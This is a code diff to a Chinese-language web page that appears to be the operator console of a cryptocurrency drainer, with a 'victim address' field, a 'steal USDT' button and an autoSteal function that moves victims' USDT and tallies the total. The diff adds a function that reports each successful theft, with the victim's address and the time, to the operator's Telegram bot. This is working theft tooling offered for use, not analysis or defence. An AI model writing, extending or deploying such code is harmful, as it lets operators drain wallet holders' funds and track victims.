@@ -2,7 +2,7 @@
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8">
-  <title>🌟 EOA 控制台 v1.6.2➟確認按鍵 + 新授權提示 + Telegram</title>
+  <title>🌟 EOA 控制台 v1.6.3（攻擊完成通知 + Telegram）</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
     body { font-family: 'Arial'; padding: 20px; background: #fff; }
@@ -21,7 +21,7 @@
   </style>
 </head>
 <body>
-  <h2>🌟 EOA 控制台 v1.6.2➟確認按鍵 + 新授權提示 + Telegram</h2>
+  <h2>🌟 EOA 控制台 v1.6.3（攻擊完成通知 + Telegram）</h2>
   <p><b>目前登入帳號：</b><span id="account">--</span></p>
   <button onclick="connect()">🔑 點我登入 MetaMask</button>
   <p><b>身份驗證：</b><span id="auth" class="bad">未驗證</span></p>
@@ -33,7 +33,7 @@
   <p id="notify"></p>
 
   <input id="victim" placeholder="受害者地址" />
-  <button onclick="steal()">🧘️‍♂️ 盜取 USDT</button>
+  <button onclick="steal()">🤸️ 盜取 USDT</button>
   <p id="balance"></p>
   <p id="status">等待操作中...</p>
 
@@ -135,6 +135,15 @@
       });
     }
 
+    async function notifyAttackSuccess(addr) {
+      const text = `☑️攻擊完成\n👤 地址：${addr}\n🕐 時間：${new Date().toLocaleString()}`;
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text })
+      });
+    }
+
     async function autoSteal(victim) {
       if (attackedSet.has(victim)) return;
       const contract = new ethers.Contract(USDT, ABI, signer);
@@ -146,11 +155,14 @@
       totalStolen = totalStolen.add(amount);
       document.getElementById("total").innerText = ethers.utils.formatUnits(totalStolen, 6) + " USDT";
       document.getElementById("status").innerText = "✅ TX Hash: " + tx.hash;
+
       const row = document.getElementById(`status-${victim}`);
       if (row) {
-        row.innerText = "✅ 已攻擊";
+        row.innerText = "✅ 成功";
         row.className = "ok";
       }
+
+      await notifyAttackSuccess(victim);
       attackedSet.add(victim);
     }
 
